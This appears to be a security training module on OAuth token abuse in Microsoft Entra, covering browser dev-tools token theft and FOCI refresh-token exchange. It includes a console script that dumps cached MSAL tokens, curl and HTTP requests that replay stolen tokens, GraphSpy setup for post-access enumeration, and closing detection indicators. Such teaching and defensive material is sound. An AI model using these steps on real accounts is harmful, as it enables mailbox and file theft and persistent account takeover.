# Attack: Module 02 — Cloud Token Abuse

## Overview

This module focuses on two closely related post-authentication attack patterns that target OAuth tokens in the Microsoft cloud:

1. **Browser Developer Tools Token Theft** — An attacker with brief access to a browser session extracts OAuth tokens directly from browser storage or network traffic. No malware required.
2. **FOCI Token Exchange with GraphSpy** — After capturing a refresh token, the attacker leverages the **Family of Client IDs (FOCI)** mechanism to impersonate the victim against any Microsoft first-party application (Graph, Exchange, Azure), then uses **GraphSpy** to enumerate and exfiltrate data.

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|---|---|---|
| Steal Application Access Token | T1528 | Stealing OAuth tokens from browser storage or application memory |
| Use Alternate Authentication Material: Application Access Token | T1550.001 | Replaying stolen tokens to authenticate as the victim |
| Cloud Service Discovery | T1526 | Using GraphSpy to enumerate tenant resources post-access |
| Email Collection | T1114.002 | Reading mailbox contents via Microsoft Graph after token replay |

---

## Background: Token Types

Understanding which tokens to target is critical for this attack chain.

| Token Type | Lifetime | Revocable | Notes |
|---|---|---|---|
| **Access Token** | 60–90 minutes | Yes, only if CAE-capable | Short-lived; authorizes API calls directly |
| **Refresh Token** | 90 days (rolling) | Yes | Long-lived; used to acquire new access tokens without re-auth |
| **Primary Refresh Token (PRT)** | 90 days | Yes | Device-bound; issues tokens for all first-party apps |

> A stolen **refresh token** is far more dangerous than a stolen access token — it enables persistent access for up to 90 days and can be used to acquire tokens for any in-scope resource without user interaction.

Reference: [Understanding tokens in Microsoft Entra ID](https://learn.microsoft.com/entra/identity/devices/concept-tokens-microsoft-entra-id)

---

## Attack 1: Browser Developer Tools Token Theft

### How It Works

Single-page applications (SPAs) and browser-based Microsoft apps use MSAL.js to authenticate users and cache tokens **locally in the browser**. This cache is stored in either `localStorage`, `sessionStorage`, or `IndexedDB` depending on the app's configuration.

An attacker with physical access to an unlocked workstation, remote access to a running browser session, or XSS execution can extract these tokens in seconds — no credential knowledge required.

### Step-by-Step Attack

**Step 1 — Open the browser dev tools console (victim's browser):**
```
F12 → Application → Storage → Local Storage / Session Storage / IndexedDB
```

**Step 2 — Search for MSAL-generated cache keys.** MSAL.js stores tokens under keys that follow predictable naming patterns:

```
Key pattern examples:
  msal.<client-id>.<tenant-id>.accesstoken-<hash>
  msal.<client-id>.<tenant-id>.refreshtoken-<hash>
  msal.<client-id>.<tenant-id>.idtoken-<hash>
```

**Step 3 — Alternatively, capture tokens live from network requests** using the Network tab:

```
F12 → Network → XHR/Fetch → filter: "token" or "graph.microsoft.com"
Look for: Authorization: Bearer <token> headers in outgoing requests
```

The raw access token can be copied from the Authorization header of any in-flight Microsoft Graph request.

**Step 4 — Manually extract the refresh token from LocalStorage:**

In the console tab, enumerate and extract the entire MSAL cache:
```javascript
// Dump entire localStorage for MSAL tokens
let keys = Object.keys(localStorage).filter(k => k.includes("msal"));
keys.forEach(k => console.log(k + ": " + localStorage.getItem(k)));
```

Parse the JSON values — the `secret` field in the `refreshtoken` entry contains the refresh token value.

**Step 5 — Verify the stolen access token** from another machine:
```bash
curl -H "Authorization: Bearer <stolen_access_token>" \
  "https://graph.microsoft.com/v1.0/me"
```

### What the Attacker Gains

| Token Stolen | Attacker Capability |
|---|---|
| **Access token** (Graph) | Immediately read mail, files, user profile for remaining lifetime (≤90 min) |
| **Refresh token** | Acquire new access tokens for any in-scope resource for up to 90 days |

---

## Attack 2: FOCI Token Exchange with GraphSpy

### What is FOCI?

The **Family of Client IDs (FOCI)** is a design feature in Microsoft's OAuth implementation where a set of trusted Microsoft **first-party client applications** share refresh tokens. If a user authenticates through any FOCI-member app, the issued refresh token can be redeemed via **any other FOCI member's client ID**.

This means: steal one refresh token → get access tokens for any Microsoft service the victim is authorized to use.

**Common FOCI Client IDs (first-party Microsoft apps):**

| App Name | Client ID |
|---|---|
| Azure CLI | `04b07795-8ddb-461a-bbee-02f9e1bf7b46` |
| Microsoft Azure PowerShell | `1950a258-227b-4e31-a9cf-717495945fc2` |
| Microsoft Office | `d3590ed6-52b3-4102-aeff-aad2292ab01c` |
| Microsoft Graph Command Line Tools | `14d82eec-204b-4c2f-b7e8-296a70dab67e` |
| Teams Web Client | `5e3ce6c0-2b1f-4285-8d4b-75ee78787346` |

### FOCI Token Exchange Mechanics

With a stolen refresh token, the attacker crafts a token exchange request to `login.microsoftonline.com` using a **different** (FOCI sibling) client ID than the one that originally issued the token:

```http
POST https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token
Content-Type: application/x-www-form-urlencoded

client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46    ← Azure CLI client ID
&grant_type=refresh_token
&refresh_token=<stolen_refresh_token>
&scope=https://graph.microsoft.com/.default offline_access
```

If FOCI applies, Microsoft Entra returns a **new access token and refresh token** for Microsoft Graph — without any user interaction or MFA prompt.

### GraphSpy

**GraphSpy** is an open-source red team tool (also used by attackers) that provides a point-and-click interface for Microsoft Graph API operations post-authentication. It accepts a stolen access or refresh token and provides capabilities including:

- Enumerate users, groups, applications
- Read user mailboxes, calendar, Teams messages
- Download files from OneDrive / SharePoint
- Execute search queries across the tenant
- Refresh tokens automatically via FOCI to maintain persistent access

```bash
# GraphSpy setup (attacker machine with stolen token)
git clone https://github.com/RedByte1337/GraphSpy
cd GraphSpy && pip install -r requirements.txt
python3 GraphSpy.py
# Enter stolen access token or refresh token at the prompt
# Select ResourceDisplayName targets (Graph, Exchange, etc.)
```

### Full FOCI + GraphSpy Attack Flow

```
1. Victim authenticates to M365 portal in browser
2. Attacker extracts refresh token from browser localStorage
3. Attacker uses Azure CLI client ID (FOCI) to exchange token:
     POST /token  grant_type=refresh_token  client_id=<Azure-CLI-ID>
     → Receives new access_token + refresh_token for Graph scope
4. Load refresh token into GraphSpy
5. GraphSpy automatically refreshes access tokens as they expire
6. Attacker enumerates: users, mail, files, Teams messages
7. Repeat exchange with other FOCI client IDs to pivot:
     Exchange Online (mail read/send)
     SharePoint (file access)
     Azure Resource Manager (subscription enumeration)
```

---

## High-Signal Indicators of Compromise

| Indicator | Detail |
|---|---|
| `IncomingTokenType = refreshToken` in non-interactive logs | Token replay — attacker reusing a stolen refresh token |
| `AuthenticationProtocol = refreshToken` | Refresh token grant used without interactive MFA step |
| `AppDisplayName = Azure CLI` with `ClientAppUsed = Python` or unusual `UserAgent` | FOCI exchange — CLI app ID used from non-CLI tooling |
| `ResourceDisplayName` changes rapidly for same user | FOCI pivoting across services (Graph → Exchange → Azure) |
| Multiple `ResourceDisplayName` targets in minutes for same token signer | GraphSpy-style enumeration across resources |
| `RiskEventTypes` includes `unfamiliarFeatures` or `anomalousToken` | Entra ID Protection detecting token replay anomalies |
| Non-interactive sign-in from IP with no prior interactive sign-in | Attacker machine IP not in victim's sign-in history |

---

## Microsoft Learn References

- [Understanding tokens in Microsoft Entra ID](https://learn.microsoft.com/entra/identity/devices/concept-tokens-microsoft-entra-id)
- [Token theft attack vectors](https://learn.microsoft.com/entra/identity/devices/concept-tokens-microsoft-entra-id#token-theft-attack-vectors)
- [Token theft playbook](https://learn.microsoft.com/security/operations/token-theft-playbook)
- [Protecting tokens in Microsoft Entra](https://learn.microsoft.com/entra/identity/devices/protecting-tokens-microsoft-entra-id)
- [Microsoft identity platform OAuth 2.0 authorization code flow — Refresh token](https://learn.microsoft.com/entra/identity-platform/v2-oauth2-auth-code-flow#refresh-the-access-token)
- [Token Protection in Conditional Access](https://learn.microsoft.com/entra/identity/conditional-access/concept-token-protection)
